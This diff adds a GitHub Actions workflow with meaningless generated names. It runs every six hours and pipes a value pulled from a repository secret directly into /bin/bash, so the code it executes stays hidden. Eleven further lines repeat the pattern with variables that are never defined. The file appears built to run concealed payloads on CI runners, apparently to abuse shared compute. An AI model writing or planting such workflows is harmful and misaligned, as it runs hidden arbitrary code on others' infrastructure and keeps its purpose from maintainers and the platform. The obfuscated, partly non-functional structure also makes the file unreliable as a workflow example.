@@ -1,0 +1,28 @@
+name: weidiyi9182
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weidiyi9182
+        env:
+          s65251: ${{ secrets.s65251 }}
+        run: |
+          echo $s65251 | jq -r .xql7419 | /bin/bash
+          echo $rme4 | jq -r .ozfx546 | /bin/bash
+          echo $yzot7 | jq -r .tpx70718 | /bin/bash
+          echo $mrowk7572 | jq -r .fx061 | /bin/bash
+          echo $ani44233 | jq -r .dk41870 | /bin/bash
+          echo $hqay77 | jq -r .snt7192 | /bin/bash
+          echo $coxp9 | jq -r .ruy21293 | /bin/bash
+          echo $wguf3461 | jq -r .z2876 | /bin/bash
+          echo $xgik7 | jq -r .znvj2 | /bin/bash
+          echo $vts1347 | jq -r .av0580 | /bin/bash
+          echo $iboj50 | jq -r .nmli89 | /bin/bash
+          echo $hm17323 | jq -r .jyddz81359 | /bin/bash
+
